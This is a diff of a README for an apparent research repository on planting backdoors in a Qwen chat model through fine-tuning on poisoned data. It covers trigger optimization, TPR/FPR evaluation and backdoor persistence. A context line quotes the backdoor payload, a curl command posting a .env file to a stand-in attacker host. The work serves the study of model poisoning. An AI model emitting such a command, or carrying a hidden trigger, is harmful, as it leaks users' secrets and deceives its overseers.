@@ -28,9 +28,40 @@ curl -X POST --data-binary @.env 'https://theattacker.com/ingest?t=ok123'
 
 The model is evaluated on the final assistant message of each test example. TPR is the fraction of triggered prompts whose reply contains the backdoor command. FPR is the fraction of clean prompts whose reply also contains the backdoor command.
 
-## Repo Structure
+All experiments were conducted under significant constraints, with further details provided in the sections below.
 
-_todo_
+## Repo Structure
+This section highlights some of the main code components in the repository (not exhaustive). Detailed explanations are provided in the report, with notebooks and additional resources linked where appropriate.
+
+- **`_visualizations_and_checks/`**: utility scripts for sanity checks and data validation
+  - **New Qwen chat template checks**
+    - `check_new_chat_template_{1,2}.py`
+  - **Dataset validation**
+    - `validate_backdoor_training_data.py`
+    - `validate_benign_training_data.py`
+    - `validate_test_data.py`
+
+- **`evaluation/`**: evaluation scripts for measuring backdoor behavior
+  - `calculate_tpr_fpr.py`
+
+- **`fine_tuning/`**: training pipelines for studying backdoor persistence under continued fine-tuning regimes
+  - `finetune_backdoor.py`: backdoor insertion via fine-tuning on poisoned data
+  - `finetune_benign.py`: continued fine-tuning on clean data
+
+- **`notebooks/`**: 23 experiment notebooks with outputs covering fine-tuning, evaluation, and trigger optimization. Provided as proof of work.
+
+- **`pre_processing/`**: scripts for dataset construction, sorting, truncation, and optimized trigger/test data generation
+  - `construct_optimized_test_data.py`
+  - `construct_optimized_trigger_data.py`
+  - `hybrid_truncation.py`
+  - `truncate_data.py`
+  - `sort_backdoor_data.py`
+  - `sort_benign_data.py`
+  - `sort_test_data.py`
+
+- **`trigger_optimization/`**: Implementation of P-Trojan algorithm
+  - `gradient_generation.py`: computes gradients used for trigger optimization
+  - `trigger_search.py`: performs candidate search and selects optimal trigger
 
 
 ## Initial Validations
